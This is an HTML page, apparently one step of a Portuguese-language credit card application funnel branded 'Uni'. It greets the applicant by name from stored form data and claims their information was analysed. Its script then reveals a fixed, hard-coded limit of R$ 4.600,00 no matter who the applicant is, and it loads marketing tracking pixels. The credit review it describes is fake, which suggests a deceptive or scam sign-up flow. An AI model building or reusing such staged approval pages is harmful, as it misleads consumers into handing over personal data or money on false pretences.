<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../assets/style.css">
    <style>
        .show-limite {
            align-items: center;
            border: 1px dashed #e10980;
            border-radius: 5px;
            color: #e10980;
            cursor: pointer;
            display: grid;
            font-size: 14px;
            gap: .3rem;
            grid-auto-flow: column;
            padding: 5px .5rem;
            display: inline;
        }
    </style>

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 40px;" class="main-content">
            <div id="analise-secao" class="mb-3" style="display: block !important;">
            <p id="mensagem-analise"></p>
                <div style="background-color: #f0f0f0; padding: 15px; border-radius: 8px;" class="justify-content-center">
                    <p id="mostraValor" style="font-size: 22px; font-weight: 600;">R$ ****</p>
                    <button onclick="verLimite()" class="show-limite"> ver limite <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--mdi" data-v-26951280="" style="" width="1em" height="1em" viewBox="0 0 24 24"><path fill="currentColor" d="M12 9a3 3 0 0 1 3 3a3 3 0 0 1-3 3a3 3 0 0 1-3-3a3 3 0 0 1 3-3m0-4.5c5 0 9.27 3.11 11 7.5c-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5M3.18 12a9.821 9.821 0 0 0 17.64 0a9.821 9.821 0 0 0-17.64 0"></path></svg></button>
                </div>
                <p>Podemos prosseguir com a solicitação do cartão?</p>
                <button class="btn btn-custom rounded-pill" onclick="location.href='../7-loading/index.php'">Sim, pode!</button>
            </div>
        </div>


        <script>
    function mostrarPagina(paginaId) {
        // Esconde todas as seções
        document.getElementById('analise-secao').style.display = 'none';

        // Verifica se 'dadosUsuarioUni' existe no localStorage
        const dadosUsuario = localStorage.getItem('dadosUsuarioUni');
        if (dadosUsuario) {
            const dados = JSON.parse(dadosUsuario);
            console.log(dados);
            console.log(localStorage);

            // Verifica se a estrutura é do tipo 'dados.data' ou 'dados' diretamente
            const primeiroNome = dados.data ? dados.data.nome.split(' ')[0] : dados.nome.split(' ')[0];
            console.log("usuarios==>", primeiroNome);

            if (paginaId === 'analise-secao') {
                // Atualiza a mensagem de análise com o nome do usuário
                const mensagemAnalise = `<strong>${primeiroNome}</strong>, analisamos suas informações e notamos que este é o <strong> primeiro cartão </strong> que você solicita conosco. Sendo assim, não conseguimos <strong> liberar limites </strong> acima de R$ 5.000,00. Mas não se preocupe, nosso sistema consegue liberar um cartão para você com um limite de até:`;
                document.getElementById('mensagem-analise').innerHTML = mensagemAnalise;
            }
        }

        // Mostra a seção desejada
        document.getElementById(paginaId).style.display = 'block';
    }

    function verLimite() {
        document.getElementById('mostraValor').innerHTML = "R$ 4.600,00";
        // alert("O seu limite é de R$ 4.600,00"); // Exemplo de limite. Substitua pelo valor real conforme necessário.
    }

    // Chamar a função onde for necessário, por exemplo, ao carregar uma nova seção
    mostrarPagina('analise-secao');
</script>

    </div>
    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>